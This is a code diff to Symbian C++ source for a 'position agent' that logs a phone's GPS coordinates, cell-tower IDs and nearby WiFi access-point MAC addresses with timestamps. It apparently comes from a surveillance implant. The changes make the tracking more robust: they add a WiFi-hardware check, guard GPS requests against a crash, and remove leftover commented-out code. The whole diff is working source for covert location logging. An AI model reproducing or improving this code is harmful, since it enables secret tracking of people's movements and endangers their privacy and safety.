@@ -18,7 +18,7 @@
  * 2. the acquirement interval of gps position is > 14 minutes  
  * 	in this case we do care about power/resources consumption; iPollGps is set to true and iGps object 
  *  is deleted. This is the behaviour outline: as soon as we a have a fix in  CAgentPosition::HandleGPSPositionL
- *  iGps object is deleted; when timer expires (CAgentPosition::HandleGPSPositionL), the iGps object 
+ *  iGps object is deleted; when timer expires (CAgentPosition::TimerExpired), the iGps object 
  *  is deleted and a new request issued, this time at 10 seconds; when the fix is obtained in CAgentPosition::HandleGPSPositionL
  *  again iGps object is deleted and so on.... 
  * Please refer to the code for specific error management.
@@ -28,6 +28,8 @@
 #include <HT\LogFile.h>
 #include <lbssatellite.h>
 #include <HT\TimeUtils.h>
+#include <FeatDiscovery.h>
+#include <featureinfo.h>
 
 struct TPositionParams
 	{
@@ -242,12 +244,16 @@ void CAgentPosition::ConstructL(const TDesC8& params)
 	TPositionParams positParams;
 	Mem::Copy(&positParams, iParams.Ptr(), sizeof(positParams));
 
+	
 	iSecondsInterv = (positParams.iInterval / 1000);
 
 	iCaptureGPS = EFalse;
 	iCaptureCellId = EFalse;
 	iCaptureWiFi = EFalse;
 	iPollGPS = EFalse;
+	
+	iAvailableWiFiModule = CFeatureDiscovery::IsFeatureSupportedL(KFeatureIdProtocolWlan);
+	
 	if ((positParams.iType & LOGGER_GPS) > 0)
 		{
 		iCaptureGPS = ETrue;
@@ -272,7 +278,7 @@ void CAgentPosition::ConstructL(const TDesC8& params)
 		iCaptureCellId = ETrue;
 		iLogCell = CLogFile::NewL(iFs);
 		}
-	if ((positParams.iType & LOGGER_WIFI) > 0 )
+	if (((positParams.iType & LOGGER_WIFI) > 0) && iAvailableWiFiModule )
 		{
 		iCaptureWiFi = ETrue;
 		}
@@ -294,15 +300,6 @@ void CAgentPosition::StartAgentCmdL()
 		iLogGps->CreateLogL(LOGTYPE_LOCATION_NEW,&gpsAdditionalData);
 		}
 
-	/* original MB but not working as expected
-	if (!iPollGPS)
-		{
-		delete iGPS;
-		iGPS = NULL;
-		iGPS = CGPSPosition::NewL(*this);
-		iGPS->ReceiveData(iSecondsInterv.Int(), KMaxTimeoutForFixMin);
-		}
-	*/
 	if(!iStopped) //this means this is the first start
 		{
 		if(iCaptureGPS)
@@ -310,7 +307,12 @@ void CAgentPosition::StartAgentCmdL()
 			delete iGPS;
 			iGPS = NULL;
 			iGPS = CGPSPosition::NewL(*this);
-			iGPS->ReceiveData(iSecondsInterv.Int(), KMaxTimeoutForFixMin);
+			if(!iPollGPS)  
+				{
+				//the following method must not be called if the update interval is > GPS_POLL_TIMEOUT_MS
+				// otherwise a panic: "lbs client fault 12" could be raised 
+				iGPS->ReceiveData(iSecondsInterv.Int(), KMaxTimeoutForFixMin);
+				}
 			}	
 		if (iCaptureCellId || iPollGPS || iCaptureWiFi)
 			{
@@ -329,12 +331,6 @@ void CAgentPosition::StopAgentCmdL()
 	iStopped = ETrue;
 	__FLOG(_L("StopAgentCmdL()"));
 	
-	/* original MB but not working as expected
-	iTimer->Cancel();
-	iPhone->Cancel();
-	delete iGPS;
-	iGPS = NULL;
-	*/
 	if(iLogCell)
 		iLogCell->CloseLogL();
 	if(iLogGps)
@@ -360,7 +356,6 @@ HBufC8* CAgentPosition::GetCellIdBufferL()
 	
 	TTime now;
 	now.UniversalTime();
-	//TInt64 filetime = GetFiletime(now);
 	TInt64 filetime = TimeUtils::GetFiletime(now);
 	cellInfo.filetime.dwHighDateTime = (filetime >> 32);
 	cellInfo.filetime.dwLowDateTime = (filetime & 0xFFFFFFFF);
@@ -389,7 +384,6 @@ HBufC8* CAgentPosition::GetCellIdBufferL()
 	return result;
 	}
 
-//HBufC8* CAgentPosition::GetGPSBufferL(TPosition pos)  // original MB
 HBufC8* CAgentPosition::GetGPSBufferL(TPositionSatelliteInfo satPos)
 	{
 	/*
@@ -410,7 +404,6 @@ HBufC8* CAgentPosition::GetGPSBufferL(TPositionSatelliteInfo satPos)
 	// insert filetime timestamp
 	TTime now;
 	now.UniversalTime();
-	//TInt64 filetime = GetFiletime(now);
 	TInt64 filetime = TimeUtils::GetFiletime(now);
 	gpsInfo.filetime.dwHighDateTime = (filetime >> 32);
 	gpsInfo.filetime.dwLowDateTime = (filetime & 0xFFFFFFFF);
@@ -492,8 +485,6 @@ HBufC8* CAgentPosition::GetWiFiBufferL(TLocationAdditionalData* additionalData)
 		//Retrieve BSSID
 		TWlanBssid bssid;
 		scanInfo->Bssid( bssid );
-		//wifiInfo.macAddress.Zero();
-		//wifiInfo.macAddress.Copy(bssid);
 		for(TInt k = 0; k < bssid.Length(); k++)
 			wifiInfo.macAddress[k] = bssid[k];
 		
@@ -530,7 +521,6 @@ HBufC8* CAgentPosition::GetWiFiBufferL(TLocationAdditionalData* additionalData)
 	return result;
 	}
 
-//void CAgentPosition::HandleGPSPositionL(TPosition position)  // original MB
 void CAgentPosition::HandleGPSPositionL(TPositionSatelliteInfo position)
 	{
 	if (iPollGPS)
@@ -547,7 +537,6 @@ void CAgentPosition::HandleGPSPositionL(TPositionSatelliteInfo position)
 		buf.CleanupClosePushL();
 		if (buf.Length() > 0)
 			{
-			//AppendLogL(buf);
 			iLogGps->AppendLogL(buf);
 			}
 		CleanupStack::PopAndDestroy(&buf);
@@ -557,7 +546,10 @@ void CAgentPosition::HandleGPSPositionL(TPositionSatelliteInfo position)
 void CAgentPosition::HandleGPSErrorL(TInt error)
 	{
 	// Can't Fix or other error... try again...
-	iGPS->ReceiveData(iSecondsInterv.Int(), KMaxTimeoutForFixMin);
+	if(!iPollGPS)
+		{
+		iGPS->ReceiveData(iSecondsInterv.Int(), KMaxTimeoutForFixMin);
+		}
 	}
 
 void CAgentPosition::TimerExpiredL(TAny* src)
@@ -595,7 +587,6 @@ void CAgentPosition::TimerExpiredL(TAny* src)
 			buf.CleanupClosePushL();
 			if (buf.Length() > 0)
 				{
-				// TODO: investigate why isn't always atomic.... 
 				CLogFile* logFile = CLogFile::NewLC(iFs);
 				logFile->CreateLogL(LOGTYPE_LOCATION_NEW, &additionalData);
 				logFile->AppendLogL(buf);
